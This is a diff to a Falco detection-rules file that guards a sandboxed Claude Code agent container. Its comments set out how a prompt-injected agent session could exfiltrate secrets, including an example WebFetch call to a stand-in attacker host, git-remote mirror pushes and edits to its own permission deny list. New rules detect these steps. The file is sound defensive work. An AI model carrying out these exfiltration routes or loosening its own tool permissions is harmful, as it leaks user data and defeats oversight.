@@ -594,6 +594,90 @@
 #     can fix. Belongs conceptually with "Known, deliberately NOT closed"
 #     above once/if confirmed against 0.39.2, not really a "future rule to
 #     design".
+#
+# Third pass, 2026-09-18, prompted by a direct user question ("what about an
+# AI talking to other agents via websites, or exfiltrating via filenames/
+# folder deletion") rather than a public-writeup sweep like the two passes
+# above -- researched via a forked subagent (sources: Simon Willison's
+# "lethal trifecta" writeup [simonwillison.net/2025/Jun/16], Johann
+# Rehberger's markdown/image exfiltration research [embracethered.com],
+# OWASP MCP03:2025 tool-poisoning, GhostAction npm-supply-chain campaign,
+# Cline npm incident Feb 2026) plus live diagnostics run directly from
+# inside a real claude-code session on this actual repo, not simulated:
+#   - Filename/folder-as-covert-channel (the user's second example): NOT a
+#     real gap in this architecture. Filesystem steganography via names/
+#     timestamps/existence is documented in the academic literature, but
+#     every source treats it as a staging mechanism, not exfiltration
+#     itself -- something still has to move the data off-host. Here,
+#     /workspace is a host bind-mount (see docker-compose.yml/README): any
+#     file or folder claude-code creates or deletes is already visible to
+#     the host process with zero Docker/Falco involvement, by design, not
+#     as a bypass. A Falco rule watching mkdir/rename/unlink patterns would
+#     be pure noise -- the "leak" already happened via the intended mount.
+#     Deliberately not adding a rule.
+#   - Markdown-link/image exfiltration, MCP tool-poisoning, A2A-protocol
+#     agent-to-agent instruction smuggling (part of the user's first
+#     example): real, well-documented research areas, but not this file's
+#     layer. In every case, what actually leaves the container is a normal
+#     HTTPS connect() to a domain squid.conf's allowlist already permits
+#     (or already blocks) -- Falco sees a routine, allowed connection,
+#     indistinguishable from legitimate traffic. The control point is
+#     squid.conf's domain allowlist (tightening it against open image-CDN/
+#     paste-bin-style domains) and Squid's own access log, not a rule here.
+#     Noted for awareness, no rule added.
+#   - WebFetch/WebSearch (the sharp, verified version of the user's first
+#     example): DONE 2026-09-18 -- a genuine, currently-open gap, live-
+#     confirmed from inside this exact repo, not just theorized. Diagnostics
+#     run directly in a real claude-code session (hostname/id/env) confirmed
+#     it was itself running as the claudecode UID-1000 user inside the
+#     sandboxed container, with HTTP_PROXY/HTTPS_PROXY pointed at
+#     egress-proxy:3128 as expected -- and yet WebFetch/WebSearch requests
+#     never touch that proxy at all: both are server-side tools, the actual
+#     outbound request to the target URL/search engine is made by
+#     Anthropic's own backend infrastructure, not by any process in this
+#     container's network namespace. Net effect: no connect() happens here
+#     (invisible to Falco -- nothing in this file could ever catch it, no
+#     matter how the condition is written) and no request reaches Squid
+#     (invisible to/unfiltered by the domain allowlist). A compromised or
+#     prompt-injected session can use WebFetch("https://attacker.tld/?d=
+#     <secret>") to exfiltrate data, or fetch attacker-planted instructions
+#     from an arbitrary page, completely bypassing this repo's entire
+#     network-sandboxing architecture. Confirmed live that
+#     /home/claudecode/.claude/settings.json (baked in by Dockerfile) had no
+#     `permissions` key at all before this fix -- WebFetch/WebSearch were
+#     fully unrestricted. Not fixable by a Falco rule -- fixed instead at
+#     the tool-permission layer: Dockerfile now bakes
+#     `permissions.deny: ["WebFetch", "WebSearch"]` into that file
+#     (confirmed via code.claude.com/docs/en/permissions.md: bare tool
+#     names remove a tool from context entirely, and deny rules from any
+#     settings scope are evaluated before allow rules and can't be
+#     overridden by a project-level .claude/settings.json -- relevant since
+#     /workspace is bind-mounted from an untrusted host directory), then
+#     chowns the file to root and drops its write bits for claudecode
+#     (UID 1000) -- same "sandboxed UID can read, not write" pattern as
+#     /workspace/.squid-claudecode-docker -- so a compromised session can't
+#     just edit its own deny list back out. "Write attempt to global Claude
+#     settings in claude-code" rule below is the Falco tripwire for that
+#     lockdown, mirroring "Write attempt to workspace Squid override"
+#     exactly.
+#   - Git-remote exfiltration: DONE 2026-09-18 -- new, concrete,
+#     Falco-detectable gap, not from the AI-agent research above but
+#     surfaced while designing the WebFetch fix's adjacent threat model.
+#     Documented pattern (GhostAction campaign, Cline npm incident Feb
+#     2026): `git remote add`/`set-url` to an attacker-controlled host,
+#     then `git push --mirror/--all/--force` to exfiltrate the whole repo.
+#     Confirmed via a full-file sweep: no git-specific macro or rule existed
+#     anywhere in this file before this date. "Git remote added or modified
+#     in claude-code" and "Forceful bulk git push in claude-code" below
+#     close this -- denylist-style detection (like "Privilege escalation
+#     attempt"/"Network tool executed during npm install"), deliberately no
+#     proc.exepath hardening, since there's no single trusted git path to
+#     anchor an allowlist exclusion to and the detection here is a behavior
+#     match, not a name-spoofable exclusion. Accepted trade-off, same shape
+#     as the npm-network-tool rule's own: doesn't distinguish "push to a
+#     different org on an already-allowlisted host (e.g. github.com)" from
+#     a legitimate forceful push to the workspace's own remote.
+#
 # Fixed 2026-09-14: `/proc/self/root` path-normalization bypass (candidate
 # from mrtc0's blog.ssrf.in/tags/falco/ writeup, confirmed live against
 # this repo's own rules rather than assumed). Not quite the same mechanism
@@ -1943,3 +2027,78 @@
     (type=%evt.type args=%evt.args command=%proc.cmdline user=%user.name container=%container.id)
   priority: CRITICAL
   tags: [claude-code, privilege-escalation, defense-evasion]
+
+# Added 2026-09-18 (user-prompted research into AI-agent-specific
+# exfiltration channels -- see OPEN ITEMS "Third pass" above for the full
+# writeup). Denylist-style detection, same shape as "Privilege escalation
+# attempt" and "Network tool executed during npm install" above --
+# deliberately no proc.exepath hardening, since this matches on behavior
+# (git subcommand + flags), not a spoofable trusted-binary name.
+- rule: Git remote added or modified in claude-code
+  desc: >
+    git remote add or git remote set-url was invoked inside claude-code.
+    Documented supply-chain exfiltration setup step (GhostAction campaign,
+    Cline npm incident Feb 2026): point a remote at an attacker-controlled
+    host, then force-push the whole repo to it. Catches the setup step,
+    before any data actually moves -- see "Forceful bulk git push in
+    claude-code" below for the data-movement step itself.
+  condition: >
+    spawned_process
+    and claude_code_container
+    and proc.name = git
+    and (proc.cmdline contains "remote add" or proc.cmdline contains "remote set-url")
+  output: >
+    Git remote added or modified in claude-code
+    (command=%proc.cmdline parent=%proc.pname user=%user.name container=%container.id)
+  priority: WARNING
+  tags: [claude-code, exfiltration, supply-chain]
+
+# Complements the rule above: catches the actual data-movement step even if
+# the remote was added by another means that doesn't spawn `git` at all
+# (e.g. editing .git/config directly).
+- rule: Forceful bulk git push in claude-code
+  desc: >
+    git push was invoked with --mirror, --all, --force, or -f inside
+    claude-code -- the exfiltration payload step of the git-remote pattern
+    above, or a destructive push to a legitimate remote either way.
+  condition: >
+    spawned_process
+    and claude_code_container
+    and proc.name = git
+    and proc.cmdline contains "push"
+    and (proc.cmdline contains "--mirror" or proc.cmdline contains "--all" or proc.cmdline contains "--force" or proc.cmdline contains " -f")
+  output: >
+    Forceful bulk git push in claude-code
+    (command=%proc.cmdline parent=%proc.pname user=%user.name container=%container.id)
+  priority: WARNING
+  tags: [claude-code, exfiltration, supply-chain]
+
+# Added 2026-09-18, alongside the Dockerfile lockdown of
+# /home/claudecode/.claude/settings.json (chowned to root, write bits
+# dropped for claudecode/UID 1000, so the baked-in WebFetch/WebSearch
+# permissions.deny can't be edited back out from inside a compromised
+# session -- see OPEN ITEMS "Third pass" above for the full writeup).
+# Detection-side tripwire in case that lockdown is ever bypassed or a
+# future image rebuild drops it -- mirrors "Write attempt to workspace
+# Squid override in claude-code" above exactly (same write-intent-flags
+# condition shape, since a permission-denied open() still reports its
+# requested flags the same way an EROFS-denied one does on this Falco
+# version).
+- rule: Write attempt to global Claude settings in claude-code
+  desc: >
+    A write was attempted against /home/claudecode/.claude/settings.json
+    inside claude-code. This file is intentionally root-owned/read-only for
+    the claudecode user (see Dockerfile) -- it carries the baked-in
+    WebFetch/WebSearch permissions.deny -- a write attempt here means
+    something tried to widen its own tool permissions from inside the
+    sandbox.
+  condition: >
+    claude_code_container
+    and evt.type in (open, openat, openat2)
+    and (evt.args contains "O_WRONLY" or evt.args contains "O_RDWR" or evt.args contains "O_CREAT" or evt.args contains "O_TRUNC")
+    and fd.name contains "/.claude/settings.json"
+  output: >
+    Write attempt to read-only Claude settings in claude-code
+    (file=%fd.name result=%evt.rawres command=%proc.cmdline user=%user.name container=%container.id)
+  priority: CRITICAL
+  tags: [claude-code, filesystem, defense-evasion]
